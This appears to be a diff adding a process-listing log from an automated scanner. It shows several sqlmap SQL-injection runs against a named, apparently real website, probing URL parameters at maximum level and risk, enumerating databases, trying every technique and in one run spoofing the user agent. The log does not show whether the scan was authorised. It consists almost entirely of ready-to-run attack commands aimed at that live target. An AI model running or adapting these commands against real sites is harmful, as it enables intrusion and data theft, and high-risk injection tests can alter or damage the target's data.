@@ -1,0 +1,13 @@
+# command: pgrep -af "sqlmap" | grep -v defunct; echo "done"
+# tool: pgrep
+# exit_code: 0
+# ts: 2026-09-30T00:29:51.680445+00:00
+# ---
+
+71973 bash -lc export WORK_PATH=/var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e; cd /var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e 2>/dev/null; cd /work && (timeout 900 sqlmap -u "https://www.infinitycapital.bh/?id=1" --batch --level=5 --risk=3 --dbs --threads=4 -v 1 > tool_outputs/inj/sqlmap_id.log 2>&1; echo "ID done rc=$?" >> tool_outputs/inj/sqlmap_summary.txt) & (timeout 900 sqlmap -u "https://www.infinitycapital.bh/_next/image?url=images%2Flogo.png&w=640&q=75" --batch --level=5 --risk=3 --dbs --threads=4 -v 1 > tool_outputs/inj/sqlmap_img.log 2>&1; echo "IMG done rc=$?" >> tool_outputs/inj/sqlmap_summary.txt) & wait; grep -Ei 'injectable|not injectable|is vulnerable|back-end DBMS|DBMS' tool_outputs/inj/sqlmap_id.log tool_outputs/inj/sqlmap_img.log | head -20; cat tool_outputs/inj/sqlmap_summary.txt
+71975 bash -lc export WORK_PATH=/var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e; cd /var/lib/scanner/16e69f07-f908-482b-8fc5-492852a61a91/1f5fe7c8-5e28-45bc-8e08-a3e868bad87e 2>/dev/null; cd /work && (timeout 900 sqlmap -u "https://www.infinitycapital.bh/?id=1" --batch --level=5 --risk=3 --dbs --threads=4 -v 1 > tool_outputs/inj/sqlmap_id.log 2>&1; echo "ID done rc=$?" >> tool_outputs/inj/sqlmap_summary.txt) & (timeout 900 sqlmap -u "https://www.infinitycapital.bh/_next/image?url=images%2Flogo.png&w=640&q=75" --batch --level=5 --risk=3 --dbs --threads=4 -v 1 > tool_outputs/inj/sqlmap_img.log 2>&1; echo "IMG done rc=$?" >> tool_outputs/inj/sqlmap_summary.txt) & wait; grep -Ei 'injectable|not injectable|is vulnerable|back-end DBMS|DBMS' tool_outputs/inj/sqlmap_id.log tool_outputs/inj/sqlmap_img.log | head -20; cat tool_outputs/inj/sqlmap_summary.txt
+71977 timeout 900 sqlmap -u https://www.infinitycapital.bh/?id=1 --batch --level=5 --risk=3 --dbs --threads=4 -v 1
+71978 /usr/bin/python3 /usr/bin/sqlmap -u https://www.infinitycapital.bh/?id=1 --batch --level=5 --risk=3 --dbs --threads=4 -v 1
+72123 timeout 900 sqlmap --batch --level=5 --risk=3 --threads=4 --random-agent --dbs -p page -u https://www.infinitycapital.bh/?page=2 --technique=BEUSTQ -v 1
+72126 /usr/bin/python3 /usr/bin/sqlmap --batch --level=5 --risk=3 --threads=4 --random-agent --dbs -p page -u https://www.infinitycapital.bh/?page=2 --technique=BEUSTQ -v 1
+done
